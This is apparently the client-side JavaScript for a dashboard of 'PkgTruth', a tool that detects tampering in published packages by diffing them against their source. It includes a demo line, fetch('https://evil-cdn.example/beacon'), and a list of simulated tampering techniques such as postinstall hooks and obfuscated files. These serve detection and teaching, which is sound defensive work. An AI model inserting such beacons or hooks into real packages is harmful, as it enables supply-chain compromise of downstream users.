/**
 * PkgTruth static dashboard.
 * No frameworks. Report strings are never assigned to innerHTML.
 */

(function () {
  "use strict";

  // Exact scoring weights used by the CLI (score.py). Used only by the
  // client-side playground simulation — live analysis does not run here.
  const SCORE_WEIGHTS = {
    install_hook_added: 40,
    new_dependency: 15,
    obfuscated: 30,
    exec_or_eval_gained: 25,
    network_domain_gained: 25,
    string_not_in_source: 20,
    unexplained_file: 10,
    native_binary_unexplained: 30
  };

  const CAP_CATEGORIES = [
    "NETWORK",
    "EXEC",
    "EVAL",
    "FS_SENSITIVE",
    "ENV_ACCESS",
    "INSTALL_HOOK",
    "NEW_DEPENDENCY",
    "NATIVE_BINARY",
    "DYNAMIC_REQUIRE",
    "OBFUSCATION"
  ];

  const PIPELINE = [
    { id: "resolve", title: "Resolve", body: "Read registry metadata or skip the network in file mode. Provenance is recorded if present." },
    { id: "source", title: "Fetch source", body: "Normalize the repo URL and pick a commit: provenance, then gitHead, then tag guesses. Local --source-dir always works offline." },
    { id: "diff", title: "Diff", body: "Hash both trees. Bucket files as identical, modified, added, or missing. Missing tests and docs are listed, not treated as risk." },
    { id: "explain", title: "Explain", body: "First matching explainer wins: sourcemap, project config, metadata-only fields, then containment of strings and imports. No global allowlist." },
    { id: "detect", title: "Detect", body: "Install hooks, new deps, obfuscation, exec/eval, novel domains, and unexplained binaries on the unexplained delta." },
    { id: "score", title: "Score", body: "Deterministic weights. LOW under 30, MEDIUM 30–59, HIGH 60+. Explained-file findings count at 10% weight." },
    { id: "report", title: "Report", body: "Stable JSON plus text/HTML. A local open-weight model may explain snippets; unverified quotes are dropped." }
  ];

  const ATTACKS = [
    {
      id: "postinstall",
      label: "Add a postinstall script",
      weights: ["install_hook_added"],
      cap: "INSTALL_HOOK",
      finding: { file: "package.json", reason: "postinstall appears in the published manifest, not in source." }
    },
    {
      id: "inject",
      label: "Inject a network call into dist/index.js",
      weights: ["network_domain_gained", "string_not_in_source"],
      cap: "NETWORK",
      finding: { file: "dist/index.js", reason: "evil-cdn.example and a fetch() call are absent from the source tree." }
    },
    {
      id: "obfuscated",
      label: "Add an obfuscated file lib/x.min.js",
      weights: ["obfuscated", "unexplained_file"],
      cap: "OBFUSCATION",
      finding: { file: "lib/x.min.js", reason: "Packed _0x identifiers with no matching source file." }
    },
    {
      id: "dep",
      label: "Add a new dependency",
      weights: ["new_dependency"],
      cap: "NEW_DEPENDENCY",
      finding: { file: "package.json", reason: "left-pad-extra is not declared in source package.json." }
    },
    {
      id: "binary",
      label: "Add a native binary",
      weights: ["native_binary_unexplained"],
      cap: "NATIVE_BINARY",
      finding: { file: "build/addon.node", reason: "ELF/PE/Mach-O magic bytes with no corresponding source." }
    }
  ];

  const HERO_SOURCE = [
    "export function format(value: unknown) {",
    "  if (value == null) return \"\";",
    "  return String(value).trim();",
    "}"
  ];

  const HERO_PACKAGE = [
    "function format(value) {",
    "  if (value == null) return \"\";",
    "  return String(value).trim();",
    "}",
    "fetch(\"https://evil-cdn.example/beacon\")"
  ];

  const SHARED_CAPS = ["ENV_ACCESS"];
  const BASE_PACKAGE_CAPS = ["ENV_ACCESS"];

  const state = {
    report: null,
    sourceKind: "sample",
    files: [],
    filter: "all",
    search: "",
    sortKey: "path",
    sortDir: 1,
    hideIdentical: false,
    reduceMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
    replayTimer: 0
  };

  const $ = (id) => document.getElementById(id);

  function text(node, value) {
    node.textContent = value == null ? "" : String(value);
  }

  function el(tag, attrs, children) {
    const node = document.createElement(tag);
    if (attrs) {
      Object.keys(attrs).forEach(function (key) {
        const val = attrs[key];
        if (val == null || val === false) return;
        if (key === "class") node.className = val;
        else if (key === "dataset") Object.keys(val).forEach(function (d) { node.dataset[d] = val[d]; });
        else if (key.slice(0, 2) === "on") node.addEventListener(key.slice(2).toLowerCase(), val);
        else if (typeof val === "boolean") node.setAttribute(key, "");
        else node.setAttribute(key, String(val));
      });
    }
    (children || []).forEach(function (child) {
      if (child == null) return;
      node.appendChild(typeof child === "string" ? document.createTextNode(child) : child);
    });
    return node;
  }

  function verdictFromScore(score) {
    if (score >= 60) return "HIGH";
    if (score >= 30) return "MEDIUM";
    return "LOW";
  }

  function themeInit() {
    const saved = localStorage.getItem("pkgtruth-theme");
    const prefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
    const theme = saved || (prefersLight ? "light" : "dark");
    document.documentElement.setAttribute("data-theme", theme);
    $("themeToggle").addEventListener("click", function () {
      const next = document.documentElement.getAttribute("data-theme") === "dark" ? "light" : "dark";
      document.documentElement.setAttribute("data-theme", next);
      localStorage.setItem("pkgtruth-theme", next);
    });
  }

  function navInit() {
    const toggle = $("navToggle");
    const nav = $("siteNav");
    toggle.addEventListener("click", function () {
      const open = !nav.classList.contains("is-open");
      nav.classList.toggle("is-open", open);
      toggle.setAttribute("aria-expanded", String(open));
    });
    nav.querySelectorAll("a").forEach(function (link) {
      link.addEventListener("click", function () { nav.classList.remove("is-open"); });
    });

    const links = Array.prototype.slice.call(nav.querySelectorAll("[data-section]"));
    const sections = links.map(function (link) { return document.getElementById(link.dataset.section); }).filter(Boolean);
    const spy = new IntersectionObserver(function (entries) {
      entries.forEach(function (entry) {
        if (!entry.isIntersecting) return;
        links.forEach(function (link) {
          link.classList.toggle("is-active", link.dataset.section === entry.target.id);
        });
      });
    }, { rootMargin: "-40% 0px -50% 0px", threshold: 0.1 });
    sections.forEach(function (sec) { spy.observe(sec); });
  }

  function typewriter(target, full, done) {
    if (state.reduceMotion) {
      text(target, full);
      if (done) done();
      return;
    }
    let i = 0;
    function tick() {
      text(target, full.slice(0, i));
      i += 1;
      if (i <= full.length) window.setTimeout(tick, 16);
      else if (done) done();
    }
    tick();
  }

  function spotlightCards() {
    document.querySelectorAll("[data-spotlight]").forEach(function (card) {
      card.addEventListener("pointermove", function (ev) {
        const r = card.getBoundingClientRect();
        card.style.setProperty("--spot-x", ev.clientX - r.left + "px");
        card.style.setProperty("--spot-y", ev.clientY - r.top + "px");
      });
    });
  }

  function revealInit() {
    const nodes = document.querySelectorAll(".reveal");
    if (state.reduceMotion) {
      nodes.forEach(function (n) { n.classList.add("is-in"); });
      return;
    }
    const io = new IntersectionObserver(function (entries) {
      entries.forEach(function (entry) {
        if (entry.isIntersecting) {
          entry.target.classList.add("is-in");
          io.unobserve(entry.target);
        }
      });
    }, { threshold: 0.12 });
    nodes.forEach(function (n) { io.observe(n); });
  }

  function renderHeroCode() {
    const src = $("heroSource");
    const pkg = $("heroPackage");
    src.textContent = "";
    pkg.textContent = "";
    HERO_SOURCE.forEach(function (line) {
      src.appendChild(el("div", null, [line]));
    });
    HERO_PACKAGE.forEach(function (line, i) {
      pkg.appendChild(el("div", { class: i === HERO_PACKAGE.length - 1 ? "injected" : "" }, [line]));
    });
  }

  function flowCanvas() {
    const canvas = $("flowCanvas");
    const ctx = canvas.getContext("2d");
    const particles = [];
    let raf = 0;
    let running = false;

    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }

    function seed() {
      particles.length = 0;
      const count = Math.min(48, Math.floor(window.innerWidth / 28));
      for (let i = 0; i < count; i += 1) {
        particles.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          t: Math.random(),
          s: 0.002 + Math.random() * 0.004
        });
      }
    }

    function frame() {
      if (!running) return;
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      const y1 = canvas.height * 0.18;
      const y2 = canvas.height * 0.22;
      const x1 = canvas.width * 0.18;
      const x2 = canvas.width * 0.82;
      ctx.strokeStyle = "rgba(34,211,238,0.16)";
      ctx.beginPath();
      ctx.moveTo(x1, y1);
      ctx.lineTo(x2, y2);
      ctx.stroke();
      particles.forEach(function (p) {
        p.t += p.s;
        if (p.t > 1) p.t = 0;
        const x = x1 + (x2 - x1) * p.t;
        const y = y1 + (y2 - y1) * p.t + Math.sin(p.t * 8) * 10;
        ctx.fillStyle = "rgba(139,92,246,0.55)";
        ctx.fillRect(x, y, 2, 2);
      });
      raf = window.requestAnimationFrame(frame);
    }

    function start() {
      if (state.reduceMotion || document.hidden) return;
      running = true;
      frame();
    }

    function stop() {
      running = false;
      window.cancelAnimationFrame(raf);
    }

    resize();
    seed();
    start();
    window.addEventListener("resize", function () { resize(); seed(); });
    document.addEventListener("visibilitychange", function () {
      if (document.hidden) stop();
      else start();
    });
  }

  function drawGauge(svg, score) {
    while (svg.firstChild) svg.removeChild(svg.firstChild);
    const clamped = Math.max(0, Math.min(100, Number(score) || 0));
    const c = 2 * Math.PI * 48;
    const ns = "http://www.w3.org/2000/svg";
    function circle(stroke, dash) {
      const n = document.createElementNS(ns, "circle");
      n.setAttribute("cx", "60");
      n.setAttribute("cy", "60");
      n.setAttribute("r", "48");
      n.setAttribute("fill", "none");
      n.setAttribute("stroke", stroke);
      n.setAttribute("stroke-width", "10");
      n.setAttribute("stroke-linecap", "round");
      n.setAttribute("stroke-dasharray", String(c));
      n.setAttribute("stroke-dashoffset", String(dash));
      svg.appendChild(n);
    }
    circle("rgba(154,168,199,0.25)", 0);
    const color = clamped >= 60 ? "#f43f5e" : clamped >= 30 ? "#fbbf24" : "#34d399";
    const offset = c - (clamped / 100) * c;
    circle(color, state.reduceMotion ? offset : c);
    if (!state.reduceMotion) {
      window.requestAnimationFrame(function () {
        svg.lastChild.style.transition = "stroke-dashoffset 700ms ease";
        svg.lastChild.setAttribute("stroke-dashoffset", String(offset));
      });
    }
  }

  function countUp(node, value) {
    const end = Number(value) || 0;
    if (state.reduceMotion) {
      text(node, String(end));
      return;
    }
    const start = performance.now();
    function tick(now) {
      const p = Math.min(1, (now - start) / 700);
      text(node, String(Math.round(end * p)));
      if (p < 1) window.requestAnimationFrame(tick);
    }
    window.requestAnimationFrame(tick);
  }

  function pipelineInit() {
    const list = $("pipeline");
    const bar = el("div", { class: "pipeline-progress" });
    list.appendChild(bar);
    PIPELINE.forEach(function (step, i) {
      const btn = el("button", { class: "pipe-step", type: "button", "aria-pressed": "false" }, [
        el("span", { class: "idx" }, [String(i + 1)]),
        step.title
      ]);
      btn.addEventListener("click", function () { showPipeline(i, false); });
      list.appendChild(btn);
    });
    showPipeline(0, false);
    $("replayBtn").addEventListener("click", replayPipeline);
  }

  function showPipeline(index, animateBar) {
    const list = $("pipeline");
    const buttons = list.querySelectorAll(".pipe-step");
    buttons.forEach(function (btn, i) {
      btn.classList.toggle("is-on", i <= index);
      btn.setAttribute("aria-pressed", String(i === index));
    });
    const step = PIPELINE[index];
    const detail = $("pipelineDetail");
    detail.textContent = "";
    detail.appendChild(el("h3", null, [step.title]));
    detail.appendChild(el("p", null, [step.body]));
    const bar = list.querySelector(".pipeline-progress");
    if (bar) bar.style.setProperty("--progress", ((index / (PIPELINE.length - 1)) * 100) + "%");
    if (animateBar) detail.focus();
  }

  function replayPipeline() {
    window.clearInterval(state.replayTimer);
    let i = 0;
    showPipeline(0, true);
    if (state.reduceMotion) {
      showPipeline(PIPELINE.length - 1, true);
      return;
    }
    state.replayTimer = window.setInterval(function () {
      i += 1;
      if (i >= PIPELINE.length) window.clearInterval(state.replayTimer);
      else showPipeline(i, true);
    }, 700);
  }

  function graphLayout() {
    const left = CAP_CATEGORIES.map(function (name, i) {
      return { name: name, x: 160, y: 36 + i * 38 };
    });
    const right = CAP_CATEGORIES.map(function (name, i) {
      return { name: name, x: 740, y: 36 + i * 38 };
    });
    return { left: left, right: right };
  }

  function renderGraph(svg, packageCaps, gainedCaps) {
    const ns = "http://www.w3.org/2000/svg";
    while (svg.firstChild) svg.removeChild(svg.firstChild);
    const layout = graphLayout();
    const pkgSet = {};
    (packageCaps || []).forEach(function (c) { pkgSet[c] = true; });
    const gained = {};
    (gainedCaps || []).forEach(function (c) { gained[c] = true; });

    function label(x, y, value, anchor) {
      const t = document.createElementNS(ns, "text");
      t.setAttribute("x", x);
      t.setAttribute("y", y);
      t.setAttribute("class", "graph-label");
      t.setAttribute("text-anchor", anchor);
      t.textContent = value;
      svg.appendChild(t);
    }

    label(160, 18, "Source cluster", "middle");
    label(740, 18, "Package cluster", "middle");

    layout.left.forEach(function (node, i) {
      const right = layout.right[i];
      const isShared = pkgSet[node.name] && !gained[node.name];
      const isGained = gained[node.name];
      if (isShared) {
        const line = document.createElementNS(ns, "path");
        line.setAttribute("d", "M" + node.x + " " + node.y + " C 360 " + node.y + ", 540 " + right.y + ", " + right.x + " " + right.y);
        line.setAttribute("class", "link");
        svg.appendChild(line);
      }
      [node, right].forEach(function (pt, idx) {
        const c = document.createElementNS(ns, "circle");
        c.setAttribute("cx", pt.x);
        c.setAttribute("cy", pt.y);
        c.setAttribute("r", "9");
        let cls = "node";
        if (idx === 0) cls += " shared";
        else if (isGained) cls += " gained pulse";
        else if (pkgSet[pt.name]) cls += " shared";
        c.setAttribute("class", cls);
        svg.appendChild(c);
        const t = document.createElementNS(ns, "text");
        t.setAttribute("x", idx === 0 ? pt.x - 16 : pt.x + 16);
        t.setAttribute("y", pt.y + 4);
        t.setAttribute("class", "graph-label");
        t.setAttribute("text-anchor", idx === 0 ? "end" : "start");
        t.textContent = isGained && idx === 1 ? pt.name + " · Gained power" : pt.name;
        svg.appendChild(t);
      });
    });
  }

  function playgroundInit() {
    const form = $("attackForm");
    ATTACKS.forEach(function (atk) {
      const box = el("input", { type: "checkbox", id: "atk-" + atk.id });
      box.addEventListener("change", updatePlayground);
      form.appendChild(el("div", { class: "attack-row" }, [
        box,
        el("label", { for: "atk-" + atk.id }, [atk.label])
      ]));
    });
    drawGauge($("playGauge"), 0);
    renderGraph($("capGraph"), BASE_PACKAGE_CAPS, []);
    renderGraph($("playGraph"), BASE_PACKAGE_CAPS, []);
    updatePlayground();
  }

  function updatePlayground() {
    let score = 0;
    const findings = [];
    const gained = [];
    ATTACKS.forEach(function (atk) {
      const on = $("atk-" + atk.id).checked;
      if (!on) return;
      atk.weights.forEach(function (key) { score += SCORE_WEIGHTS[key]; });
      gained.push(atk.cap);
      findings.push(atk.finding);
    });
    const verdict = verdictFromScore(score);
    text($("playScore"), String(score));
    const badge = $("playVerdict");
    text(badge, verdict);
    badge.setAttribute("data-verdict", verdict);
    drawGauge($("playGauge"), Math.min(100, score));
    text($("playHeadline"), findings.length
      ? "Simulated attacks enabled. Score uses the same weights as the CLI."
      : "No attacks enabled. Capabilities match the clean demo package.");
    const list = $("playFindings");
    list.textContent = "";
    if (!findings.length) list.appendChild(el("li", { class: "empty" }, ["No findings."]));
    findings.forEach(function (f) {
      list.appendChild(el("li", null, [
        el("strong", { class: "mono" }, [f.file]),
        " — ",
        f.reason
      ]));
    });
    const pkgCaps = BASE_PACKAGE_CAPS.concat(gained);
    renderGraph($("playGraph"), pkgCaps, gained);
  }

  function validateReport(data) {
    if (!data || typeof data !== "object") return "This file is not a JSON object.";
    if (data.schema_version !== "1.0") return "This is not a PkgTruth 1.0 report (schema_version missing or unsupported).";
    if (!data.package || typeof data.package !== "object") return "Missing package metadata.";
    if (!data.summary || typeof data.summary !== "object") return "Missing summary.";
    const verdict = data.summary.verdict;
    if (verdict !== "LOW" && verdict !== "MEDIUM" && verdict !== "HIGH") return "summary.verdict must be LOW, MEDIUM, or HIGH.";
    if (typeof data.summary.score !== "number") return "summary.score must be a number.";
    if (!Array.isArray(data.files)) return "files must be an array.";
    if (!data.capabilities || typeof data.capabilities !== "object") return "Missing capabilities.";
    if (!data.provenance || typeof data.provenance !== "object") return "Missing provenance.";
    if (!data.ai || typeof data.ai !== "object") return "Missing ai block.";
    return "";
  }

  function loadStatus(msg, isError) {
    const status = $("loadStatus");
    const err = $("loadError");
    if (isError) {
      err.hidden = false;
      text(err, msg);
    } else {
      err.hidden = true;
      text(err, "");
      text(status, msg);
    }
  }

  async function fetchJson(url) {
    const res = await fetch(url);
    if (!res.ok) throw new Error("Could not load " + url + " (" + res.status + ")");
    return res.json();
  }

  function applyReport(data, kind) {
    const problem = validateReport(data);
    if (problem) {
      loadStatus(problem, true);
      return;
    }
    state.report = data;
    state.sourceKind = kind;
    state.files = data.files.slice();
    renderAnalyzer();
    renderBenchmark(data);
    loadStatus(kind === "sample" ? "Sample report loaded. This is a recording, not live analysis." : "Loaded report.json from disk.");
  }

  function renderAnalyzer() {
    const r = state.report;
    const pkg = r.package;
    const sum = r.summary;
    text($("sampleLabel"), state.sourceKind === "sample" ? "Sample report" : "Loaded report");
    text($("reportScore"), String(sum.score));
    const badge = $("reportVerdict");
    text(badge, sum.verdict);
    badge.setAttribute("data-verdict", sum.verdict);
    drawGauge($("reportGauge"), Math.min(100, sum.score));
    text($("pkgTitle"), (pkg.name || "unknown") + "@" + (pkg.version || "unknown"));
    text($("pkgHeadline"), sum.headline || "");
    text($("pkgRepo"), pkg.repo || "—");
    text($("pkgCommit"), pkg.commit ? String(pkg.commit).slice(0, 12) : "—");
    text($("pkgSource"), pkg.source_resolution || "—");

    const counts = sum.counts || {};
    const cards = $("summaryCards");
    cards.textContent = "";
    ["identical", "modified", "added", "missing", "explained", "suspicious"].forEach(function (key) {
      const n = el("strong", { class: "n" }, ["0"]);
      cards.appendChild(el("article", { class: "glass stat-card" }, [
        n,
        el("span", null, [key])
      ]));
      countUp(n, counts[key] || 0);
    });

    const prov = r.provenance;
    const badges = $("provenanceBadges");
    badges.textContent = "";
    function addBadge(label, ok) {
      const cls = ok === true ? "ok" : ok === false ? "bad" : "neutral";
      badges.appendChild(el("span", { class: "badge " + cls }, [label]));
    }
    addBadge(prov.attestation_present ? "Attestation present" : "Attestation missing", !!prov.attestation_present);
    addBadge(prov.repo_match === true ? "Repo match" : prov.repo_match === false ? "Repo mismatch" : "Repo match unknown", prov.repo_match);
    addBadge(prov.commit_match === true ? "Commit match" : prov.commit_match === false ? "Commit mismatch" : "Commit match unknown", prov.commit_match);
    const notes = $("provenanceNotes");
    notes.textContent = "";
    (prov.notes || []).forEach(function (n) { notes.appendChild(el("li", null, [String(n)])); });

    renderFileTable();
    renderCapDiff(r.capabilities);
    renderAi(r.ai);
  }

  function fileFilters() {
    const row = $("filterChips");
    if (row.childElementCount) return;
    ["all", "suspicious", "explained", "normal", "added", "modified", "missing", "identical"].forEach(function (id) {
      const btn = el("button", { class: "chip" + (id === "all" ? " is-on" : ""), type: "button" }, [id]);
      btn.addEventListener("click", function () {
        state.filter = id;
        row.querySelectorAll(".chip").forEach(function (c) { c.classList.remove("is-on"); });
        btn.classList.add("is-on");
        renderFileTable();
      });
      row.appendChild(btn);
    });
  }

  function renderFileTable() {
    fileFilters();
    const body = $("fileTableBody");
    body.textContent = "";
    const q = state.search.toLowerCase();
    const rows = state.files.filter(function (f) {
      if (state.hideIdentical && f.bucket === "identical") return false;
      if (q && String(f.path || "").toLowerCase().indexOf(q) === -1) return false;
      if (state.filter === "all") return true;
      if (state.filter === "suspicious" || state.filter === "explained" || state.filter === "normal") return f.status === state.filter;
      return f.bucket === state.filter;
    }).sort(function (a, b) {
      const ka = String(a[state.sortKey] || "");
      const kb = String(b[state.sortKey] || "");
      return ka < kb ? -state.sortDir : ka > kb ? state.sortDir : 0;
    });
    rows.forEach(function (file) {
      const tr = el("tr", { class: "file-row" + (file.status === "suspicious" ? " suspicious" : ""), tabindex: "0" });
      tr.appendChild(el("td", { class: "mono" }, [file.path || ""]));
      tr.appendChild(el("td", null, [file.bucket || ""]));
      tr.appendChild(el("td", null, [
        el("span", { class: "status-chip " + (file.status || "") }, [
          file.status === "suspicious" ? "Suspicious" : file.status === "explained" ? "Explained" : "Normal"
        ])
      ]));
      tr.appendChild(el("td", null, [file.explained_by || "none"]));
      tr.addEventListener("click", function () { openDrawer(file); });
      tr.addEventListener("keydown", function (ev) {
        if (ev.key === "Enter" || ev.key === " ") {
          ev.preventDefault();
          openDrawer(file);
        }
      });
      body.appendChild(tr);
    });
    if (!rows.length) {
      body.appendChild(el("tr", null, [el("td", { colspan: "4" }, ["No files match these filters."])]));
    }
  }

  function renderCapDiff(caps) {
    const source = caps.source || {};
    const pack = caps.package || {};
    const gained = caps.gained || [];
    text($("gainedCounter"), gained.length + " gained power" + (gained.length === 1 ? "" : "s"));
    const wrap = $("capColumns");
    wrap.textContent = "";
    const left = el("div", null, [el("h3", null, ["Source can do"])]);
    const right = el("div", null, [el("h3", null, ["Package can do"])]);
    const gainedSet = {};
    gained.forEach(function (g) { gainedSet[g.category + "|" + g.detail] = true; });
    CAP_CATEGORIES.forEach(function (cat) {
      left.appendChild(el("h4", null, [cat]));
      right.appendChild(el("h4", null, [cat]));
      (source[cat] || []).forEach(function (item) {
        left.appendChild(el("div", { class: "cap-item" }, [String(item)]));
      });
      if (!(source[cat] || []).length) left.appendChild(el("div", { class: "cap-item empty" }, ["none"]));
      (pack[cat] || []).forEach(function (item) {
        const isGained = gainedSet[cat + "|" + item] || gained.some(function (g) { return g.category === cat && String(g.detail) === String(item); });
        right.appendChild(el("div", { class: "cap-item" + (isGained ? " gained" : "") }, [String(item)]));
      });
      if (!(pack[cat] || []).length) right.appendChild(el("div", { class: "cap-item empty" }, ["none"]));
    });
    wrap.appendChild(left);
    wrap.appendChild(right);
  }

  function streamText(node, value) {
    if (state.reduceMotion) {
      text(node, value);
      return;
    }
    let i = 0;
    function tick() {
      text(node, value.slice(0, i));
      i += 2;
      if (i <= value.length) window.setTimeout(tick, 12);
    }
    tick();
  }

  function renderAi(ai) {
    const status = $("aiStatus");
    const box = $("aiExplanations");
    box.textContent = "";
    if (!ai.used) {
      text(status, "Local model not used, using template explanations");
    } else {
      text(status, "Model: " + (ai.model || "local") + ". Quotes are checked against the file.");
    }
    (ai.explanations || []).forEach(function (item) {
      const p = el("p");
      const quotes = el("div");
      (item.quotes || []).forEach(function (q) {
        if (q.verified === false) {
          quotes.appendChild(el("div", { class: "quote" }, [
            el("span", { class: "badge bad" }, ["unverified, hidden"])
          ]));
          return;
        }
        quotes.appendChild(el("div", { class: "quote" }, [
          String(q.text || ""),
          el("span", { class: "verified" }, ["verified in file"])
        ]));
      });
      box.appendChild(el("article", { class: "ai-card" }, [
        el("strong", { class: "mono" }, [item.file || ""]),
        p,
        quotes
      ]));
      streamText(p, String(item.text || ""));
    });
    if (!(ai.explanations || []).length) box.appendChild(el("p", { class: "empty" }, ["No explanations in this report."]));
  }

  function openDrawer(file) {
    const drawer = $("drawer");
    drawer.hidden = false;
    text($("drawerTitle"), "Evidence");
    text($("drawerPath"), file.path || "");
    const findings = $("drawerFindings");
    findings.textContent = "";
    (file.findings || []).forEach(function (f) {
      findings.appendChild(el("article", { class: "ai-card" }, [
        el("p", null, [
          el("span", { class: "sev-" + (f.severity || "low") }, [(f.severity || "low").toUpperCase()]),
          " · ",
          f.rule || "",
          " · weight ",
          String(f.weight || 0)
        ]),
        el("p", null, [f.reason || ""])
      ]));
    });
    if (!(file.findings || []).length) findings.appendChild(el("p", { class: "empty" }, [file.reason || "No findings."]));

    const code = $("drawerCode");
    code.textContent = "";
    const lines = {};
    (file.findings || []).forEach(function (f) {
      const ln = Number(f.line) || 1;
      lines[ln] = f.snippet || "";
    });
    const nums = Object.keys(lines).map(Number).sort(function (a, b) { return a - b; });
    if (!nums.length) {
      code.appendChild(el("div", { class: "code-line" }, ["No flagged lines."]));
    } else {
      const start = Math.max(1, nums[0] - 2);
      const end = nums[nums.length - 1] + 2;
      for (let n = start; n <= end; n += 1) {
        const hit = Object.prototype.hasOwnProperty.call(lines, n);
        code.appendChild(el("div", { class: "code-line" + (hit ? " hit" : "") }, [
          el("span", null, [String(n)]),
          el("span", null, [hit ? lines[n] : " "])
        ]));
      }
    }

    $("copyEvidence").onclick = function () {
      const blob = JSON.stringify({ path: file.path, reason: file.reason, findings: file.findings || [] }, null, 2);
      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(blob);
    };
    $("drawerClose").focus();
  }

  function closeDrawer() {
    $("drawer").hidden = true;
  }

  function analyzerInit() {
    const zone = $("dropZone");
    const input = $("fileInput");
    zone.addEventListener("click", function () { input.click(); });
    zone.addEventListener("keydown", function (ev) {
      if (ev.key === "Enter" || ev.key === " ") {
        ev.preventDefault();
        input.click();
      }
    });
    ["dragenter", "dragover"].forEach(function (name) {
      zone.addEventListener(name, function (ev) {
        ev.preventDefault();
        zone.classList.add("is-over");
      });
    });
    ["dragleave", "drop"].forEach(function (name) {
      zone.addEventListener(name, function (ev) {
        ev.preventDefault();
        zone.classList.remove("is-over");
      });
    });
    zone.addEventListener("drop", function (ev) {
      const file = ev.dataTransfer.files && ev.dataTransfer.files[0];
      if (file) readFile(file);
    });
    input.addEventListener("change", function () {
      if (input.files && input.files[0]) readFile(input.files[0]);
    });
    $("loadFileBtn").addEventListener("click", function () { input.click(); });
    $("demoCleanBtn").addEventListener("click", function () { loadDemo("clean"); });
    $("demoTamperedBtn").addEventListener("click", function () { loadDemo("tampered"); });
    $("fileSearch").addEventListener("input", function (ev) {
      state.search = ev.target.value;
      renderFileTable();
    });
    $("hideIdentical").addEventListener("change", function (ev) {
      state.hideIdentical = ev.target.checked;
      renderFileTable();
    });
    document.querySelectorAll("[data-sort]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        const key = btn.getAttribute("data-sort");
        if (state.sortKey === key) state.sortDir *= -1;
        else {
          state.sortKey = key;
          state.sortDir = 1;
        }
        renderFileTable();
      });
    });
    $("drawerClose").addEventListener("click", closeDrawer);
    $("drawerBackdrop").addEventListener("click", closeDrawer);
    document.addEventListener("keydown", function (ev) {
      if (ev.key === "Escape") closeDrawer();
    });
    $("tabInspect").addEventListener("click", function () { switchTab("inspect"); });
    $("tabCompare").addEventListener("click", function () {
      switchTab("compare");
      renderCompare();
    });
  }

  function switchTab(name) {
    const inspect = name === "inspect";
    $("inspectPanel").hidden = !inspect;
    $("comparePanel").hidden = inspect;
    $("tabInspect").classList.toggle("is-active", inspect);
    $("tabCompare").classList.toggle("is-active", !inspect);
    $("tabInspect").setAttribute("aria-selected", String(inspect));
    $("tabCompare").setAttribute("aria-selected", String(!inspect));
  }

  function readFile(file) {
    const reader = new FileReader();
    reader.onload = function () {
      try {
        applyReport(JSON.parse(String(reader.result)), "file");
      } catch (err) {
        loadStatus("Could not parse JSON. " + err.message, true);
      }
    };
    reader.readAsText(file);
  }

  async function loadDemo(kind) {
    const url = kind === "tampered" ? "data/demo-tampered.json" : "data/demo-clean.json";
    try {
      const data = await fetchJson(url);
      applyReport(data, "sample");
    } catch (err) {
      loadStatus("Could not load the sample report. Serve this folder over HTTP. " + err.message, true);
    }
  }

  async function renderCompare() {
    const host = $("compareSplit");
    host.textContent = "";
    try {
      const pair = await Promise.all([fetchJson("data/demo-clean.json"), fetchJson("data/demo-tampered.json")]);
      pair.forEach(function (rep, i) {
        host.appendChild(el("article", { class: "glass compare-card" }, [
          el("p", { class: "sample-pill" }, [i === 0 ? "Clean · sample report" : "Tampered · sample report"]),
          el("p", { class: "verdict-badge", "data-verdict": rep.summary.verdict }, [rep.summary.verdict]),
          el("p", null, ["Score " + rep.summary.score]),
          el("p", null, [rep.summary.headline]),
          el("p", null, ["Gained powers: " + ((rep.capabilities.gained || []).length)])
        ]));
      });
    } catch (err) {
      host.appendChild(el("p", { class: "error" }, ["Could not load comparison samples."]));
    }
  }

  function renderBenchmark(data) {
    const host = $("benchmarkBody");
    host.textContent = "";
    const bench = data.benchmark;
    const history = data.history || data.version_history;
    if (!bench && !history) {
      host.appendChild(el("p", { class: "empty" }, [
        "Benchmark and version history appear once the CLI writes them into a report. Until then this panel stays empty on purpose."
      ]));
      return;
    }
    if (history && Array.isArray(history)) {
      const strip = el("div", { class: "history-strip" });
      history.forEach(function (h) {
        strip.appendChild(el("div", { class: "history-dot" }, [
          el("strong", null, [String(h.version || "")]),
          el("div", { class: "verdict-badge", "data-verdict": h.verdict || "LOW" }, [h.verdict || "LOW"]),
          el("div", null, [String(h.score != null ? h.score : "")])
        ]));
      });
      host.appendChild(el("h3", null, ["Version history"]));
      host.appendChild(strip);
    }
    if (bench) {
      const table = el("table", { class: "file-table" });
      const thead = el("thead", null, [el("tr", null, [
        el("th", null, ["Metric"]),
        el("th", null, ["Value"])
      ])]);
      const tbody = el("tbody");
      [["Detection rate", bench.detection_rate], ["False-alarm rate", bench.false_alarm_rate]].forEach(function (row) {
        if (row[1] == null) return;
        tbody.appendChild(el("tr", null, [el("td", null, [row[0]]), el("td", null, [String(row[1])])]));
      });
      table.appendChild(thead);
      table.appendChild(tbody);
      host.appendChild(el("h3", null, ["Benchmark"]));
      host.appendChild(table);
    }
  }

  async function boot() {
    themeInit();
    navInit();
    spotlightCards();
    revealInit();
    renderHeroCode();
    pipelineInit();
    playgroundInit();
    analyzerInit();
    if (!state.reduceMotion) flowCanvas();
    const full = $("heroSubFull").textContent.trim();
    typewriter($("heroTagline"), full);

    const params = new URLSearchParams(window.location.search);
    const reportUrl = params.get("report");
    if (reportUrl) {
      try {
        applyReport(await fetchJson(reportUrl), reportUrl.indexOf("data/") === 0 ? "sample" : "file");
      } catch (err) {
        loadStatus("Could not load ?report= URL. " + err.message, true);
        loadDemo("clean");
      }
    } else {
      loadDemo("clean");
    }
  }

  document.addEventListener("DOMContentLoaded", boot);
})();
